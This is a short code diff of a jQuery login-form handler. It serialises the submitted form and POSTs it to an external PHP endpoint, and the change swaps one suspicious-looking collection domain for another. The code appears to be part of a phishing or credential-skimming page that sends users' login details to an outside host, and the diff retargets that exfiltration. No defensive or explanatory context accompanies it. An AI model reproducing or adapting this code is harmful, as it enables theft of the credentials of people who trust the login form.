@@ -2,7 +2,7 @@ $(".form-login").submit(function() {
     var d = $(".form-login");
 
     $.ajax({
-        url: "https://img081.gacortr.my.id/apiii.php",
+        url: "https://pusat.mycomunity.cfd/apiii.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
